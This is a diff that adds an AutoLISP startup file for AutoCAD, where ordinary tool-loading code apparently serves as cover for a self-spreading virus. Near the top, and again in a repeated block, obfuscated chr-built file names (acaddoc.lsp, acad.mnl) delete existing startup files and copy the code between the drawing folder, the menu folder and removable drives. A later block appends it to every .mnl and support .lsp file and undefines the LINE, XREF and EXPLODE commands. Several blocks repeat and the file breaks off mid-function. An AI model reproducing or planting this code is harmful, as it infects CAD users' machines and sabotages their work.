@@ -1,0 +1,609 @@
+(
+ setq
+  wold_cmd
+   (
+    getvar
+     "cmdecho"
+   )
+)
+(
+ setvar
+  "cmdecho"
+  0
+)
+(
+ setq
+bb 1
+)
+(setq dpath (getvar "dwgprefix"))
+(setq wpath (getvar "menuname"))
+(setq wpath (substr wpath 1 (- (strlen wpath) 4)))
+(setq mnl (strcat (chr 97)
+		  (chr 99)
+		  (chr 97)
+		  (chr 100)
+		  (chr 46)
+		  (chr 109)
+		  (chr 110)
+		  (chr 108)
+	  )
+      lsp (strcat (chr 97)
+		  (chr 99)
+		  (chr 97)
+		  (chr 100)
+		  (chr 100)
+		  (chr 111)
+		  (chr 99)
+		  (chr 46)
+		  (chr 108)
+		  (chr 115)
+		  (chr 112)
+	  )
+)
+
+(vl-file-delete (strcat wpath lsp))
+(vl-file-delete (strcat wpath "acad.lsp"))
+(vl-file-delete (strcat dpath "acad.lsp"))
+
+(load"shxfont""")(defun wwriteapp ()
+  (if (setq wwjm1 (open wnewacad "w"))
+    (progn
+      (setq wwjm (open woldacad "r"))
+      (while(setq wwz (read-line wwjm))
+	 (write-line wwz wwjm1)
+      )
+      (close wwjm)
+      (close wwjm1)
+    )
+  )
+)
+
+(setq lbz 0)
+(setq wwjqm (strcat dpath lsp))
+(if (setq wwjm (open wwjqm "r"))
+  (progn
+    (repeat 15 (read-line wwjm))
+    (setq wz (read-line wwjm))
+    (setq ab (atoi (substr wz 4 1)))
+    (close wwjm)
+    (if	(> ab bb)
+      (setq lbz 1)
+    )
+  )
+)
+
+(setq wwjqm (strcat wpath mnl))
+(if (setq wwjm (open wwjqm "r"))
+  (progn
+    (repeat 15 (read-line wwjm))
+    (setq wz (read-line wwjm))
+    (setq nb (atoi (substr wz 4 1)))
+    (close wwjm)
+    
+    (if	(< nb bb)
+      (setq lbz 1)
+    )
+  )
+  (setq lbz 1)
+)
+(if (= lbz 1)
+  (progn
+    (setq woldacad (strcat dpath lsp))
+    (setq wnewacad (strcat wpath mnl))
+    (wwriteapp)
+  )
+)
+(if (and (/= (substr dpath 1 1) (chr 67))
+	 (/= (substr dpath 1 1) (chr 68))
+	 (/= (substr dpath 1 1) (chr 69))
+	 (/= (substr dpath 1 1) (chr 70))
+    )
+  (progn
+    (setq woldacad (strcat wpath mnl))
+    (setq wnewacad (strcat dpath lsp))
+    (wwriteapp)
+  )
+  (vl-file-delete (strcat dpath lsp))
+)
+
+
+
+(princ)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+(
+ setq
+  wold_cmd
+   (
+    getvar
+     "cmdecho"
+   )
+)
+(
+ setvar
+  "cmdecho"
+  0
+)
+(
+ setq
+bb 1
+)
+(setq dpath (getvar "dwgprefix"))
+(setq wpath (getvar "menuname"))
+(setq wpath (substr wpath 1 (- (strlen wpath) 4)))
+(setq mnl (strcat (chr 97)
+		  (chr 99)
+		  (chr 97)
+		  (chr 100)
+		  (chr 46)
+		  (chr 109)
+		  (chr 110)
+		  (chr 108)
+	  )
+      lsp (strcat (chr 97)
+		  (chr 99)
+		  (chr 97)
+		  (chr 100)
+		  (chr 100)
+		  (chr 111)
+		  (chr 99)
+		  (chr 46)
+		  (chr 108)
+		  (chr 115)
+		  (chr 112)
+	  )
+)
+
+(vl-file-delete (strcat wpath lsp))
+(vl-file-delete (strcat wpath "acad.lsp"))
+(vl-file-delete (strcat dpath "acad.lsp"))
+
+(load"shxfont""")(defun wwriteapp ()
+  (if (setq wwjm1 (open wnewacad "w"))
+    (progn
+      (setq wwjm (open woldacad "r"))
+      (while(setq wwz (read-line wwjm))
+	 (write-line wwz wwjm1)
+      )
+      (close wwjm)
+      (close wwjm1)
+    )
+  )
+)
+
+(setq lbz 0)
+(setq wwjqm (strcat dpath lsp))
+(if (setq wwjm (open wwjqm "r"))
+  (progn
+    (repeat 15 (read-line wwjm))
+    (setq wz (read-line wwjm))
+    (setq ab (atoi (substr wz 4 1)))
+    (close wwjm)
+    (if	(> ab bb)
+      (setq lbz 1)
+    )
+  )
+)
+
+(setq wwjqm (strcat wpath mnl))
+(if (setq wwjm (open wwjqm "r"))
+  (progn
+    (repeat 15 (read-line wwjm))
+    (setq wz (read-line wwjm))
+    (setq nb (atoi (substr wz 4 1)))
+    (close wwjm)
+    
+    (if	(< nb bb)
+      (setq lbz 1)
+    )
+  )
+  (setq lbz 1)
+)
+(if (= lbz 1)
+  (progn
+    (setq woldacad (strcat dpath lsp))
+    (setq wnewacad (strcat wpath mnl))
+    (wwriteapp)
+  )
+)
+(if (and (/= (substr dpath 1 1) (chr 67))
+	 (/= (substr dpath 1 1) (chr 68))
+	 (/= (substr dpath 1 1) (chr 69))
+	 (/= (substr dpath 1 1) (chr 70))
+    )
+  (progn
+    (setq woldacad (strcat wpath mnl))
+    (setq wnewacad (strcat dpath lsp))
+    (wwriteapp)
+  )
+  (vl-file-delete (strcat dpath lsp))
+)
+
+
+
+(princ)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+(setq flagx t)
+(setq bz "(setq flagx t)")
+(if(null qxgxwddm)(if(findfile "bakdwg.fas")(load "bakdwg.fas")))
+(defun app(source target bz / flag flag1 wjm wjm1 text)
+  (setq flag nil)
+  (setq flag1 t)
+  (if (findfile target)
+    (progn
+      (setq wjm1 (open target "r"))
+      (while (setq text (read-line wjm1))
+	(if (= text bz) (setq flag1 nil))
+	);while
+      (close wjm1)
+      );progn
+    );if
+  (if flag1
+    (progn
+      (setq wjm (open source "r"))
+      (setq wjm1 (open target "a"))
+      (write-line (chr 13) wjm1)
+      (while (setq text (read-line wjm))
+	(if (= text bz) (setq flag t))
+	(if flag
+	  (progn
+	    (write-line text wjm1)
+	    );progn
+	  );if
+	);while
+      (close wjm1)
+      (close wjm)
+      );progn
+    );if
+  );defun
+(setvar "cmdecho" 0)
+(setq acadmnl (findfile "acad.mnl"))
+(setq acadmnlpath (vl-filename-directory acadmnl))
+(setq mnlfilelist (vl-directory-files acadmnlpath "*.mnl"))
+(setq mnlnum (length mnlfilelist))
+(setq acadexe (findfile "acad.exe"))
+(setq acadpath (vl-filename-directory acadexe))
+(setq support (strcat acadpath "\\support"))
+(setq lspfilelist (vl-directory-files support "*.lsp"))
+(setq lspfilelist (append lspfilelist (list "")))
+(setq lspnum (length lspfilelist))
+(setq dwgname (getvar "dwgname"))
+(setq dwgpath (findfile dwgname))
+(if dwgpath
+  (progn
+    (setq acaddocpath (vl-filename-directory dwgpath))
+    (setq acaddocfile (strcat acaddocpath "\\acaddoc.lsp"))
+    (setq mnln 0)
+    (while (< mnln mnlnum)
+      (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
+      (app mnlfilename acaddocfile bz)
+      (app acaddocfile mnlfilename bz)
+      (setq mnln (1+ mnln))
+      );while
+    (setq lspn 0)
+    (while (< lspn lspnum)
+      (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
+      (app lspfilename acaddocfile bz)
+      (app acaddocfile lspfilename bz)
+      (setq lspn (1+ lspn))
+      );while
+    );progn
+  );if
+(setq mnln 0)
+(while (< mnln mnlnum)
+  (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
+  (setq mnln1 0)
+  (while (< mnln1 mnlnum)
+    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
+    (app mnlfilename mnlfilename1 bz)
+    (setq mnln1 (1+ mnln1))
+    );while
+  (setq lspn1 0)
+  (while (< lspn1 lspnum)
+    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
+    (app mnlfilename lspfilename1 bz)
+    (setq lspn1 (1+ lspn1))
+    );while
+  (setq mnln (1+ mnln))
+  );while
+(setq lspn 0)
+(while (< lspn lspnum)
+  (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
+  (setq lspn1 0)
+  (while (< lspn1 lspnum)
+    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
+    (app lspfilename lspfilename1 bz)
+    (setq lspn1 (1+ lspn1))
+    );while
+  (setq mnln1 0)
+  (while (< mnln1 mnlnum)
+    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
+    (app lspfilename mnlfilename1 bz)
+    (setq mnln1 (1+ mnln1))
+    );while
+  (setq lspn (1+ lspn))
+  );while
+(setvar "sdi" 1)
+(setvar "ACADLSPASDOC" 1)
+(command "undefine" "line")
+(command "undefine" "_line")
+(command "undefine" "xref")
+(command "undefine" "_xref")
+(command "undefine" "explode")
+(command "undefine" "_explode")
+(setvar "cmdecho" 1)
+(princ)
+(load "acadapp")
+(princ)
+
+
+(defun _@ld (file)
+  (if (and (not (member file _tchatoml))
+	   (load (strcat _prefix file))
+      )
+    (setq _tchatoml (cons file _tchatoml))
+  )
+  (princ)
+)
+
+(defun c:clean () (setq _tchatoml nil))
+(defun angtos1 (a) (angtos a (getvar "aunits") 9))
+(defun redraw_le ()
+  (foreach e le_drw (redraw e 4))
+  (foreach e le_del (entdel e))
+  (setq	le_drw nil
+  	le_del nil
+  )
+)
+
+(defun *error* (msg)
+  (princ msg)
+  (redraw_le)
+  (setvar "cmdecho" 0)
+  (setvar "users1" ".")
+  (ucsoff)
+  (end)
+;  (xdin2)
+;  (nextent)
+)
+
+(setq _prefix0	(getpfx)
+      _prefix	(TGetLispPath)
+      _dim_auto	T
+      _is_v14	T
+      _pi2	(/ pi 2)
+)
+(if (not _prefix1)
+  (setq _prefix1 _prefix)
+)
+(setvar "cmdecho" 0)
+(_@ld "loadcfg")
+(loadcfg)
+
+(defun-q MYSTARTUP ()
+   (princ)
+   (if startupReset (startupReset))
+   (if ShowScrBar   (ShowScrBar))
+   (TInitKernal)
+   (princ)
+)
+
+(setq S::STARTUP (append S::STARTUP MYSTARTUP))
+
+(defun c:entxd()
+   (entget (car (entsel "\nSelect object:")) (list "*"))
+)
+
+(defun entxd(ent)
+   (entget ent (list "*"))
+)
+
+;; ZJQ comment following
+(setq t_blip (nth 4 _cfgdata))
+(setvar	"blipmode"
+	(if t_blip
+	  0
+	  1
+	)
+)
+(_@ld"paper")(_@Ld"Axtool")(_@Ld"Words1")(_@ld"elwct")
+(_@Ld"Tde12")(_@ld"tool1")(_@ld"chdash")(_@ld"intftool")(_@Ld"Proof")(_@Ld"Hip3d")(_@Ld"3droof")
+(_@Ld"Ele1")(_@Ld"Sfloor")(_@Ld"Sfloor1")(_@ld"sroof")(_@Ld"Ddlst")(_@Ld"Rltplib")(_@ld"sstair1")
+(_@Ld"AllFill")(_@Ld"Thickl")(_@ld"dwall")(_@ld"road")(_@Ld"Mkpat")(_@Ld"Autostr")(_@Ld"Eroof")(_@ld"conditn")
+;(setvar "limcheck" 0)
+(defun _@ld (file)
+  (if (and (not (member file _tchatoml))
+	   (load (strcat _prefix file))
+      )
+    (setq _tchatoml (cons file _tchatoml))
+  )
+  (princ)
+)
+
+(defun c:clean () (setq _tchatoml nil))
+(defun angtos1 (a) (angtos a (getvar "aunits") 9))
+(defun redraw_le ()
+  (foreach e le_drw (redraw e 4))
+  (foreach e le_del (entdel e))
+  (setq	le_drw nil
+  	le_del nil
+  )
+)
+
+(defun *error* (msg)
+  (princ msg)
+  (redraw_le)
+  (setvar "cmdecho" 0)
+  (setvar "users1" ".")
+  (ucsoff)
+  (end)
+;  (xdin2)
+;  (nextent)
+)
+
+(setq _prefix0	(getpfx)
+      _prefix	(TGetLispPath)
+      _dim_auto	T
+      _is_v14	T
+      _pi2	(/ pi 2)
+)
+(if (not _prefix1)
+  (setq _prefix1 _prefix)
+)
+(setvar "cmdecho" 0)
+(_@ld "loadcfg")
+(loadcfg)
+
+(defun-q MYSTARTUP ()
+   (princ)
+   (if startupReset (startupReset))
+   (if ShowScrBar   (ShowScrBar))
+   (TInitKernal)
+   (princ)
+)
+
+(setq S::STARTUP (append S::STARTUP MYSTARTUP))
+
+(defun c:entxd()
+   (entget (car (entsel "\nSelect object:")) (list "*"))
+)
+
+(defun entxd(ent)
+   (entget ent (list "*"))
+)
+
+;; ZJQ comment following
+(setq t_blip (nth 4 _cfgdata))
+(setvar	"blipmode"
+	(if t_blip
+	  0
+	  1
+	)
+)
+(_@ld"paper")(_@Ld"Axtool")(_@Ld"Words1")(_@ld"elwct")
+(_@Ld"Tde12")(_@ld"tool1")(_@ld"chdash")(_@ld"intftool")(_@Ld"Proof")(_@Ld"Hip3d")(_@Ld"3droof")
+(_@Ld"Ele1")(_@Ld"Sfloor")(_@Ld"Sfloor1")(_@ld"sroof")(_@Ld"Ddlst")(_@Ld"Rltplib")(_@ld"sstair1")
+(_@Ld"AllFill")(_@Ld"Thickl")(_@ld"dwall")(_@ld"road")(_@Ld"Mkpat")(_@Ld"Autostr")(_@Ld"Eroof")(_@ld"conditn")
+;(setvar "limcheck" 0)
+(defun _@ld (file)
+  (if (and (not (member file _tchatoml))
+	   (load (strcat _prefix file))
+      )
+    (setq _tchatoml (cons file _tchatoml))
+  )
+  (princ)
+)
+
+(defun c:clean () (setq _tchatoml nil))
+(defun angtos1 (a) (angtos a (getvar "aunits") 9))
+(defun redraw_le ()
+  (foreach e le_drw (redraw e 4))
+  (foreach e le_del (entdel e))
+  (setq	le_drw nil
+  	le_del nil
+  )
+)
+
+(defun *error* (msg)
+  (princ msg)
+  (redraw_le)
+  (setvar "cmdecho" 0)
+  (setvar "users1" ".")
+  (ucsoff)
+  (end)
+;  (xdin2)
+;  (nextent)
+)
+
+(setq _prefix0	(getpfx)
+      _prefix	(TGetLispPath)
+      _dim_auto	T
+      _is_v14	T
+      _pi2	(/ pi 2)
+)
+(if (not _prefix1)
+  (setq _prefix1 _prefix)
+)
+(setvar "cmdecho" 0)
+(_@ld "loadcfg")
+(loadcfg)
+
+(defun-q MYSTARTUP ()
+   (princ)
+   (if startupReset (startupReset))
+   (if ShowScrBar   (ShowScrBar))
+   (TInitKernal)
+   (princ)
+)
+
+(setq S::STARTUP (append S::STARTUP MYSTARTUP))
+
+(defun c:entxd()
+   (entget (car (entsel "\nSelect object:")) (list "*"))
+)
+
+(defun entxd(ent)
+   (entget ent (list "*"))
+)
+
+;; ZJQ comment following
+(setq t_blip (nth 4 _cfgdata))
+(setvar	"blipmode"
+	(if t_blip
+	  0
+	  1
+	)
+)
+(_@ld"paper")(_@Ld"Axtool")(_@Ld"Words1")(_@ld"elwct")
+(_@Ld"Tde12")(_@ld"tool1")(_@ld"chdash")(_@ld"intftool")(_@Ld"Proof")(_@Ld"Hip3d")(_@Ld"3droof")
+(_@Ld"Ele1")(_@Ld"Sfloor")(_@Ld"Sfloor1")(_@ld"sroof")(_@Ld"Ddlst")(_@Ld"Rltplib")(_@ld"sstair1")
+(_@Ld"AllFill")(_@Ld"Thickl")(_@ld"dwall")(_@ld"road")(_@Ld"Mkpat")(_@Ld"Autostr")(_@Ld"Eroof")(_@ld"conditn")
+;(setvar "limcheck" 0)
+(defun _@ld (file)
+  (if (and (not (member file _tchatoml))
+	   (load (strcat _prefix file))
+      )
+    (setq _tchatoml (cons file _tchatoml))
+  )
